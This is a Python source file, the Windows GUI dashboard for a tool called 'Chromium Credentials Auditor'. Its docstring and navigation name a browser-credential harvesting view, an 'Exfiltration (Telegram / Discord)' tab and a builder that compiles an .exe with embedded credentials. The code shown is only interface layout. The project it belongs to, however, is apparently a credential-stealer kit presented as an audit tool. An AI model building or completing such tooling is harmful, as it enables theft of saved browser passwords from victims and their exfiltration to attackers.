"""
Chromium Credentials Auditor — GUI Dashboard
Entry point: python gui_app.py

Architecture:
  gui_app.py          → App shell: sidebar nav + tab container
  gui/theme.py        → Design system (colors, fonts, widget factories)
  gui/views/
    auditoria.py      → Launch audits, live log, stats
    resultados.py     → Credential table with search/reveal
    post_audit.py     → Exfiltration (Telegram / Discord)
    reportes.py       → Report file browser
    mantenimiento.py  → Dependency check, log viewer, cleanup
    builder.py        → Compile .exe with embedded credentials
"""

import sys
import tkinter as tk
from pathlib import Path

import customtkinter as ctk

# ── Apply theme before any widget creation ────────────────────────────────────
from gui.theme import COLORS, FONTS, PAD, make_label

from gui.views.auditoria     import AuditoriaView
from gui.views.resultados    import ResultadosView
from gui.views.post_audit    import PostAuditView
from gui.views.reportes      import ReportesView
from gui.views.mantenimiento import MantenimientoView
from gui.views.builder       import BuilderView
from gui.views.exit          import ExitView


class App(ctk.CTk):
    """Root application window with sidebar navigation."""

    NAV_ITEMS = [
        ("🔍", "Auditoría",     "auditoria"),
        ("📊", "Resultados",    "resultados"),
        ("📤", "Post-Audit",    "post_audit"),
        ("📁", "Reportes",      "reportes"),
        ("🔧", "Mantenimiento", "mantenimiento"),
        ("🔨", "Builder",       "builder"),
        ("🚪", "Salir",         "exit"),
    ]

    def __init__(self):
        super().__init__()
        self.title("Chromium Credentials Auditor v1.3.0")
        self.geometry("1280x800")
        self.minsize(1024, 640)
        self.configure(fg_color=COLORS["bg_root"])

        # App icon
        ico = Path(__file__).parent / "app.ico"
        if ico.exists():
            try:
                self.iconbitmap(str(ico))
            except Exception:
                pass

        self._active_tab = None
        self._nav_btns: dict[str, ctk.CTkButton] = {}
        self._views: dict[str, ctk.CTkFrame] = {}

        self._build_layout()
        self._wire_callbacks()
        self._switch_tab("auditoria")

    # ── Layout ────────────────────────────────────────────────────────────────

    def _build_layout(self):
        # ── Sidebar ───────────────────────────────────────────────────────────
        self._sidebar = ctk.CTkFrame(
            self,
            width=220,
            fg_color=COLORS["bg_sidebar"],
            corner_radius=0,
        )
        self._sidebar.pack(side="left", fill="y")
        self._sidebar.pack_propagate(False)

        # Logo / brand
        brand = ctk.CTkFrame(self._sidebar, fg_color="transparent")
        brand.pack(fill="x", padx=PAD["md"], pady=(PAD["lg"], PAD["sm"]))

        ctk.CTkLabel(
            brand,
            text="⬡",
            font=("Segoe UI Emoji", 32),
            text_color=COLORS["accent"],
        ).pack(side="left", padx=(0, PAD["sm"]))

        title_col = ctk.CTkFrame(brand, fg_color="transparent")
        title_col.pack(side="left")
        ctk.CTkLabel(title_col, text="Chromium", font=FONTS["subtitle"], text_color=COLORS["text_primary"]).pack(anchor="w")
        ctk.CTkLabel(title_col, text="Auditor Suite", font=FONTS["tiny"], text_color=COLORS["text_secondary"]).pack(anchor="w")

        # Divider
        ctk.CTkFrame(self._sidebar, fg_color=COLORS["border"], height=1).pack(fill="x", padx=PAD["md"], pady=PAD["sm"])

        # Nav label
        ctk.CTkLabel(
            self._sidebar,
            text="NAVEGACIÓN",
            font=FONTS["tiny"],
            text_color=COLORS["text_muted"],
        ).pack(anchor="w", padx=PAD["lg"], pady=(PAD["sm"], PAD["xs"]))

        # Nav buttons
        for icon, label, key in self.NAV_ITEMS:
            if key == "exit": continue # We'll place it separately at bottom
            btn = ctk.CTkButton(
                self._sidebar,
                text=f"  {icon}  {label}",
                anchor="w",
                font=FONTS["nav"],
                fg_color="transparent",
                hover_color=COLORS["bg_card"],
                text_color=COLORS["text_secondary"],
                corner_radius=8,
                height=44,
                command=lambda k=key: self._switch_tab(k),
            )
            btn.pack(fill="x", padx=PAD["sm"], pady=2)
            self._nav_btns[key] = btn

        # ── Bottom sidebar: exit + version info ──────────────────────────────────────
        bottom = ctk.CTkFrame(self._sidebar, fg_color="transparent")
        bottom.pack(side="bottom", fill="x", padx=PAD["md"], pady=PAD["md"])
        
        # Separated Exit button at the bottom
        exit_btn = ctk.CTkButton(
            bottom,
            text="  🚪  SALIR",
            anchor="w",
            font=FONTS["nav"],
            fg_color="transparent",
            hover_color=COLORS["danger_dim"],
            text_color=COLORS["danger"],
            corner_radius=8,
            height=44,
            command=lambda: self._switch_tab("exit"),
        )
        exit_btn.pack(fill="x", pady=(0, PAD["md"]))
        self._nav_btns["exit"] = exit_btn

        ctk.CTkFrame(bottom, fg_color=COLORS["border"], height=1).pack(fill="x", pady=(0, PAD["sm"]))
        ctk.CTkLabel(bottom, text="v1.3.0 · Python " + sys.version.split()[0], font=FONTS["tiny"], text_color=COLORS["text_muted"]).pack(anchor="w")
        ctk.CTkLabel(bottom, text="Chromium Auditor Suite", font=FONTS["tiny"], text_color=COLORS["text_muted"]).pack(anchor="w")

        # ── Content area ──────────────────────────────────────────────────────
        self._content = ctk.CTkFrame(self, fg_color=COLORS["bg_panel"], corner_radius=0)
        self._content.pack(side="left", fill="both", expand=True)

        # Tab title bar
        self._tab_bar = ctk.CTkFrame(self._content, fg_color=COLORS["bg_root"], height=52, corner_radius=0)
        self._tab_bar.pack(fill="x")
        self._tab_bar.pack_propagate(False)

        self._tab_title = ctk.CTkLabel(
            self._tab_bar,
            text="",
            font=FONTS["title"],
            text_color=COLORS["text_primary"],
            anchor="w",
        )
        self._tab_title.pack(side="left", padx=PAD["lg"], pady=PAD["sm"])

        self._tab_badge = ctk.CTkLabel(
            self._tab_bar,
            text="",
            font=FONTS["badge"],
            text_color=COLORS["accent"],
            fg_color=COLORS["accent_dim"],
            corner_radius=6,
        )
        self._tab_badge.pack(side="left", padx=(PAD["xs"], 0), pady=PAD["sm"])

        # Thin accent line under tab bar
        ctk.CTkFrame(self._content, fg_color=COLORS["accent_dim"], height=2).pack(fill="x")

        # Views container
        self._views_container = ctk.CTkFrame(self._content, fg_color="transparent")
        self._views_container.pack(fill="both", expand=True)

        # Instantiate all views
        self._views = {
            "auditoria":     AuditoriaView(self._views_container,     engine_ref=None),
            "resultados":    ResultadosView(self._views_container),
            "post_audit":    PostAuditView(self._views_container),
            "reportes":      ReportesView(self._views_container),
            "mantenimiento": MantenimientoView(self._views_container),
            "builder":       BuilderView(self._views_container),
            "exit":          ExitView(self._views_container),
        }

        # Start all views hidden
        for view in self._views.values():
            view.pack_forget()

    # ── Cross-tab wiring ──────────────────────────────────────────────────────

    def _wire_callbacks(self):
        """Connect audit results to downstream tabs."""
        audit_view: AuditoriaView = self._views["auditoria"]

        def on_results(results, hp, cp):
            # Resultados tab
            self._views["resultados"].load_results(results)
            # Post-Audit tab
            self._views["post_audit"].set_report_paths(hp, cp)
            # Reportes tab
            if hp:
                self._views["reportes"].set_audit_dir(hp.parent)
                self._views["mantenimiento"].set_audit_dir(hp.parent)
            elif cp:
                self._views["reportes"].set_audit_dir(cp.parent)
                self._views["mantenimiento"].set_audit_dir(cp.parent)

        audit_view.set_results_callback(on_results)

    # ── Navigation ────────────────────────────────────────────────────────────

    def _switch_tab(self, key: str):
        if self._active_tab == key:
            return

        # Hide current
        if self._active_tab and self._active_tab in self._views:
            self._views[self._active_tab].pack_forget()

        # Update nav button styles
        for k, btn in self._nav_btns.items():
            if k == key:
                btn.configure(
                    fg_color=COLORS["accent_dim"],
                    text_color=COLORS["accent"],
                    font=FONTS["nav_active"],
                )
            else:
                btn.configure(
                    fg_color="transparent",
                    text_color=COLORS["text_secondary"],
                    font=FONTS["nav"],
                )

        # Show new view
        self._views[key].pack(fill="both", expand=True)
        self._active_tab = key

        # Update tab bar
        icon, label, _ = next(item for item in self.NAV_ITEMS if item[2] == key)
        self._tab_title.configure(text=f" {label}")
        self._tab_badge.configure(text=f"  {icon}  ")


def main():
    if sys.platform != "win32":
        print("ERROR: Este dashboard solo funciona en Windows.")
        sys.exit(1)
    app = App()
    app.mainloop()


if __name__ == "__main__":
    main()
